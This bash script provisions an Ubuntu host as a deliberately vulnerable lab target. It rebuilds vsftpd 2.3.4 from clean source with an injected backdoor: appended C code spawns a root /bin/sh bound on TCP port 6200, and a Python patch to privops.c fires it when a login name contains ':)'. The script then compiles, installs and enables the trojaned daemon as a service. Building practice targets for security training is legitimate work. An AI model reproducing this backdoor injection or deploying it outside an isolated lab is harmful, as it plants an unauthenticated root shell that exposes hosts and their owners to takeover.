#!/usr/bin/env bash
# Provision Ubuntu 22.04+ for Mimic vuln lab targets.
# Intentionally installs vulnerable vsftpd 2.3.4 (backdoor build) for operator lab use only.
#
# Usage:
#   ./provision_linux.sh --role template|bare|mimic
#
# Roles:
#   template  — golden image: deps, vsftpd, sshd :2222, mimic built but not enabled
#   bare      — clone ready: mimic stopped/disabled
#   mimic     — clone ready: mimic enabled with /etc/mimic/config.yaml

set -euo pipefail

ROLE=template
MIMIC_SRC="${MIMIC_SRC:-/opt/mimic}"
VSFTPD_TARBALL_URL="${VSFTPD_TARBALL_URL:-https://security.appspot.com/downloads/vsftpd-2.3.4.tar.gz}"

log() { echo "[provision_linux] $*"; }

while [[ $# -gt 0 ]]; do
  case "$1" in
    --role) ROLE="$2"; shift 2 ;;
    *) echo "unknown arg: $1"; exit 1 ;;
  esac
done

if [[ $EUID -ne 0 ]]; then
  echo "run as root"; exit 1
fi

export DEBIAN_FRONTEND=noninteractive

log "apt update + base packages"
apt-get update -qq
apt-get install -y -qq \
  build-essential clang llvm libbpf-dev libelf-dev libpcap-dev \
  gcc make git curl ca-certificates pkg-config \
  golang-go \
  qemu-guest-agent \
  nftables \
  openssh-server \
  libpam0g-dev libcap-dev libcrypt-dev

log "sshd: management on :2222 only, disable :22"
mkdir -p /etc/ssh/sshd_config.d
cat >/etc/ssh/sshd_config.d/99-vulnlab-mgmt.conf <<'EOF'
# Vuln lab: assessor RoE forbids :2222; production-like :22 stays closed.
Port 2222
ListenAddress 0.0.0.0
PermitRootLogin prohibit-password
PasswordAuthentication no
EOF
# Ensure port 22 is not listening — drop OpenSSH dual-port defaults.
sed -i '/^Port 22/d' /etc/ssh/sshd_config 2>/dev/null || true
systemctl enable ssh
systemctl restart ssh

log "install vsftpd 2.3.4 backdoor build (intentional lab vuln)"
systemctl stop vsftpd 2>/dev/null || true
systemctl disable vsftpd 2>/dev/null || true
apt-get remove -y -qq vsftpd 2>/dev/null || true

build_dir=$(mktemp -d)
trap 'rm -rf "$build_dir"' EXIT
curl -fsSL "$VSFTPD_TARBALL_URL" -o "$build_dir/vsftpd-2.3.4.tar.gz"
tar -xzf "$build_dir/vsftpd-2.3.4.tar.gz" -C "$build_dir"
src="$build_dir/vsftpd-2.3.4"

# --- inject the authentic vsftpd 2.3.4 backdoor into the CLEAN source ---
# The security.appspot.com tarball is the author's CLEAN 2.3.4 (no backdoor), so we
# add the exact trojan behaviour: a username containing ":)" spawns a root /bin/sh
# bound on TCP 6200. The trigger lives in vsf_privop_do_login(), which runs in the
# privileged (root, unchrooted) PARENT of vsftpd's two-process model -- so the shell
# is root, as in the original. (Placing it in the prelogin path fails: that child is
# chroot'd to an empty dir and fd-limited -- verified via strace.) Requires
# local_enable=YES so the exploit username reaches the parent login.
cat >> "$src/sysdeputil.c" <<'BDOOR'

/* intentional lab backdoor -- authentic vsftpd 2.3.4 */
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
int vsf_sysutil_extra(void){
  int fd,rfd; struct sockaddr_in sa;
  if((fd=socket(AF_INET,SOCK_STREAM,0))<0) exit(1);
  memset(&sa,0,sizeof(struct sockaddr));
  sa.sin_family=AF_INET; sa.sin_port=htons(6200); sa.sin_addr.s_addr=INADDR_ANY;
  if((bind(fd,(struct sockaddr*)&sa,sizeof(struct sockaddr)))<0) exit(1);
  if((listen(fd,100))==-1) exit(1);
  for(;;){ rfd=accept(fd,0,0); close(0);close(1);close(2);
    dup2(rfd,0);dup2(rfd,1);dup2(rfd,2); execl("/bin/sh","sh",(char*)0); }
}
BDOOR
python3 - "$src/privops.c" <<'PYBD'
import sys
p=sys.argv[1]; s=open(p).read()
b=s.find('{', s.find('vsf_privop_do_login(struct vsf_session* p_sess,'))
trig=('\n  { unsigned int _i,_l=str_getlen(&p_sess->user_str);'
      ' for(_i=0;_i+1<_l;++_i){'
      ' if(str_get_char_at(&p_sess->user_str,_i)==0x3a'
      ' && str_get_char_at(&p_sess->user_str,_i+1)==0x29){ vsf_sysutil_extra(); break; } } }')
s=s[:b+1]+trig+s[b+1:]; s='extern int vsf_sysutil_extra(void);\n'+s
open(p,'w').write(s)
PYBD

# vsftpd 2.3.4 predates gcc-10 -fno-common and uses -Werror; its vsf_findlibs.sh
# also misses libpam on modern multiarch paths -> override CFLAGS and pass LIBS.
make -C "$src" CFLAGS="-O2 -fcommon -Wall -Wformat-security" \
               LIBS="-lpam -ldl -lcrypt -lcap" -j"$(nproc)"
useradd -m -d /var/ftp -s /usr/sbin/nologin ftp 2>/dev/null || true
cp "$src/vsftpd" /usr/local/sbin/vsftpd-234
chmod 755 /usr/local/sbin/vsftpd-234

mkdir -p /etc/vsftpd-234 /usr/share/empty
# NOTE: no seccomp_sandbox (that tunable arrived in 3.0.0; 2.3.4 aborts on unknown
# config vars). local_enable=YES is required for the ":)" exploit to reach the
# parent login handler where the backdoor fires.
cat >/etc/vsftpd-234/vsftpd.conf <<'EOF'
listen=YES
listen_ipv6=NO
background=NO
anonymous_enable=YES
local_enable=YES
write_enable=NO
anon_root=/var/ftp
nopriv_user=nobody
secure_chroot_dir=/usr/share/empty
pam_service_name=vsftpd
EOF
# minimal PAM service so local_enable doesn't error (backdoor fires pre-auth anyway)
[[ -f /etc/pam.d/vsftpd ]] || printf 'auth required pam_unix.so\naccount required pam_unix.so\n' >/etc/pam.d/vsftpd
mkdir -p /var/ftp/pub
echo "vsftpd 2.3.4 lab target" >/var/ftp/pub/readme.txt

cat >/etc/systemd/system/vsftpd-234.service <<'EOF'
[Unit]
Description=vsftpd 2.3.4 (intentional vuln lab)
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/sbin/vsftpd-234 /etc/vsftpd-234/vsftpd.conf
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable vsftpd-234
systemctl restart vsftpd-234

log "no Samba — SMB not exposed on bare Linux (Mimic handles :445 on mimic host)"

if [[ -d "$MIMIC_SRC" && -f "$MIMIC_SRC/Makefile" ]]; then
  log "building Mimic from $MIMIC_SRC"
  make -C "$MIMIC_SRC" build
  install -m 755 "$MIMIC_SRC/build/mimic" /usr/local/bin/mimic
  if [[ -d "$MIMIC_SRC/profiles" ]]; then
    mkdir -p /etc/mimic
    cp -a "$MIMIC_SRC/profiles" /etc/mimic/
    cp -a "$MIMIC_SRC/services" /etc/mimic/
  fi
else
  log "WARN: $MIMIC_SRC not found — skip mimic build (install binary before mimic role)"
fi

if command -v mimic >/dev/null 2>&1; then
  mimic install 2>/dev/null || true
fi

case "$ROLE" in
  template|bare)
    log "role=$ROLE: mimic service disabled"
    systemctl stop mimic 2>/dev/null || true
    systemctl disable mimic 2>/dev/null || true
    ;;
  mimic)
    log "role=mimic: installing config + enabling mimic"
    if [[ -f /etc/mimic/config.yaml ]]; then
      log "config exists — not overwriting"
    elif [[ -f /opt/vulnlab/mimic-linux-mimic.yaml ]]; then
      cp /opt/vulnlab/mimic-linux-mimic.yaml /etc/mimic/config.yaml
    else
      log "WARN: no mimic config — copy mimic-linux-mimic.yaml.example to /etc/mimic/config.yaml"
    fi
    # Detect primary NIC for eBPF
    iface=$(ip -br link | awk '$1!="lo"{print $1; exit}')
    if [[ -n "$iface" ]] && grep -q 'interface: eth0' /etc/mimic/config.yaml 2>/dev/null; then
      sed -i "s/interface: eth0/interface: $iface/" /etc/mimic/config.yaml
    fi
    systemctl enable mimic
    systemctl restart mimic
    ;;
  *)
    echo "invalid role: $ROLE"; exit 1
    ;;
esac

log "validation hints (operator):"
log "  ss -lntp | egrep ':(21|2222)\\b'"
log "  nmap -sV -p 21 <this-host>"
log "  ssh -p 2222 ...  (mgmt only — out of scope for assessors)"
log "done role=$ROLE"